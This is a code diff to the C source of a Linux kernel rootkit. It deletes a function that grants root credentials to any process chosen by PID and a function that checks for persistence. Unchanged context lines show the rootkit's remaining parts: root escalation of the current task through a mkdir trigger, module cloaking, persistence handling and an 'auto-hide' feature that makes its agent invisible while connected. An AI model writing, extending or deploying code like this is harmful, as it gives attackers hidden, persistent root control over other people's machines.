@@ -8,7 +8,7 @@
 #include <net/inet_sock.h>
 #include "rootkit.h"
 
-// Privilege escalation (current task, used by mkdir trigger)
+// Privilege escalation
 int rk_escalate(void)
 {
 	struct cred *new_cred;
@@ -17,51 +17,6 @@ int rk_escalate(void)
 	if (!new_cred)
 		return -ENOMEM;
 	return commit_creds(new_cred);
-}
-
-// Privilege escalation for a remote PID
-int rk_escalate_pid(pid_t target_pid)
-{
-	struct pid *pid_struct;
-	struct task_struct *task;
-	struct cred *new_cred;
-	int ret = -ESRCH;
-
-	rcu_read_lock();
-	pid_struct = find_vpid(target_pid);
-	if (!pid_struct) {
-		rcu_read_unlock();
-		return -ESRCH;
-	}
-	task = pid_task(pid_struct, PIDTYPE_PID);
-	if (!task) {
-		rcu_read_unlock();
-		return -ESRCH;
-	}
-	get_task_struct(task);
-	rcu_read_unlock();
-
-	new_cred = prepare_kernel_cred(&init_task);
-	if (!new_cred) {
-		put_task_struct(task);
-		return -ENOMEM;
-	}
-
-	ret = 0;
-	rcu_read_lock();
-	if (pid_alive(task)) {
-		const struct cred *old = __task_cred(task);
-		rcu_assign_pointer(task->real_cred, new_cred);
-		rcu_assign_pointer(task->cred, new_cred);
-		put_cred(old);
-	} else {
-		put_cred(new_cred);
-		ret = -ESRCH;
-	}
-	rcu_read_unlock();
-
-	put_task_struct(task);
-	return ret;
 }
 
 // Module cloaking
@@ -106,17 +61,6 @@ int rk_unpersist(void)
 		return PTR_ERR(f);
 	filp_close(f, NULL);
 	return 0;
-}
-
-bool rk_is_persisted(void)
-{
-	struct file *f;
-
-	f = filp_open(PERSIST_PATH, O_RDONLY, 0);
-	if (IS_ERR(f))
-		return false;
-	filp_close(f, NULL);
-	return true;
 }
 
 // Auto-hide: make the agent invisible while connected.
